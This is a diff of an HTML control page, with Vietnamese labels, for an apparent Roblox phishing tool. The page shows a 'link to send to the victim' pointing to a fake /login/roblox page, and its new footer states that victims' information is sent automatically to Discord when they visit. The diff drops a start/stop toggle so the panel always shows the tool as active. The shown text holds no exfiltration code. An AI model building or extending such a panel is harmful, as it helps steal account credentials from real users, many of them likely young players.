@@ -9,10 +9,7 @@
         .container { background: #1a1a1a; padding: 30px; border-radius: 16px; border: 1px solid #0f0; max-width: 600px; width: 100%; text-align: center; }
         .meme-box { width: 100%; height: 300px; background: #222; border-radius: 12px; overflow: hidden; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; }
         .meme-box img { width: 100%; height: 100%; object-fit: cover; }
-        .status { font-size: 24px; margin: 20px 0; }
-        .status .on { color: #0f0; }
-        .status .off { color: #f00; }
-        .info { color: #aaa; font-size: 14px; }
+        .status { font-size: 24px; margin: 20px 0; color: #0f0; }
         .link-area { background: #222; padding: 10px; border-radius: 8px; margin: 10px 0; font-size: 14px; word-break: break-all; }
         .link-area code { color: #0f0; }
         .footer { margin-top: 20px; font-size: 12px; color: #555; }
@@ -24,21 +21,11 @@
         <div class="meme-box" id="memeBox">
             <img id="memeImage" src="https://i.imgflip.com/1bij.jpg" alt="meme">
         </div>
-        <div class="status">
-            Trạng thái: 
-            {% if status == 'start' %}
-                <span class="on">🔴 ĐANG HOẠT ĐỘNG</span>
-            {% else %}
-                <span class="off">⏹ ĐÃ DỪNG</span>
-            {% endif %}
-        </div>
+        <div class="status">✅ ĐANG HOẠT ĐỘNG</div>
         <div class="link-area">
             Link gửi nạn nhân: <code>/login/roblox</code>
         </div>
-        <div class="info">
-            Để bắt đầu, sửa file <code>status.txt</code> thành <code>start</code> trên GitHub.
-        </div>
-        <div class="footer">Tự động lấy thông tin khi nạn nhân truy cập.</div>
+        <div class="footer">Khi nạn nhân truy cập, thông tin tự động gửi về Discord.</div>
     </div>
 
     <script>
